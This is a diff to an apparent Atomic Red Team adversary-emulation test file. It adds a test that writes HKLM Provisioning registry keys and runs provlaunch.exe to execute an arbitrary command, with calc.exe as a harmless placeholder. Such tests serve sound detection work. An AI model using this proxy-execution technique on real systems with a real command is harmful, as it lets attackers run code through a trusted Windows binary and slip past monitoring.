@@ -350,3 +350,17 @@ atomic_tests:
       Remove-Item -Path #{dest_path} -Recurse -Force
     name: powershell
     elevation_required: true
+- name: Provlaunch.exe Executes Arbitrary Command via Registry Key
+  description: |
+    Provlaunch.exe executes a command defined in the Registry. This test will create the necessary registry keys and values, then run provlaunch.exe to execute an arbitrary command.
+    - https://twitter.com/0gtweet/status/1674399582162153472
+    - https://lolbas-project.github.io/lolbas/Binaries/Provlaunch/
+    Registry keys are deleted after successful execution.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
+      reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
+      c:\windows\system32\provlaunch.exe LOLBin
+    name: command_prompt
